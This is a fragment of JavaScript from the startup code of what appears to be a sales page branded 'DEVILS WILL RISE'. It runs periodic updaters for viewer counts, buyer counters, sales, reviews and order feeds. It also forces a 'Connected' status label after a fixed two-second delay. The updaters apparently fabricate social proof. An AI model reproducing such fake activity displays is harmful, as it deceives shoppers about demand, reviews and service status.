        startLiveActivityFeed(); setupImageUpload(); updateStocks(); updateSuccessRate();
        updatePlanViewers(); updateBuyingCounter(); updateTodaySold(); updateDaysRunning(); updateActivityLog(); addLiveOrderFeed();
        setInterval(updatePlanViewers, 15000); setInterval(updateBuyingCounter, 10000); setInterval(updateTodaySold, 30000);
        setInterval(addRandomReview, 25000); setInterval(updateSuccessRate, 45000); setInterval(updateStocks, 60000);
        setInterval(addLiveOrderFeed, 20000); setInterval(autoBackup, 3600000);
        if (Notification.permission === 'default') Notification.requestPermission();
        setTimeout(function() { var ws = document.getElementById('wsStatus'); if (ws) ws.className = 'ws-status ws-connected'; var wst = document.getElementById('wsStatusText'); if (wst) wst.textContent = 'Connected'; }, 2000);
        resetInactivityTimer();
        
        centralizedPollingLoop();
        console.log('✅ DEVILS WILL RISE v13.4 - READY | HTTPS + 409 FIXED');
    } catch (e) {
        reportErrorToTelegram({ message: 'Init: ' + e.message, source: 'init' });
    }
}

init();
window.addEventListener('beforeunload', function() {
    if (state.countdownInterval) clearInterval(state.countdownInterval);
    if (state.pollingInterval) clearTimeout(state.pollingInterval);
    if (state.scheduleTimer) clearInterval(state.scheduleTimer);
    if (inactivityTimer) clearTimeout(inactivityTimer);
});
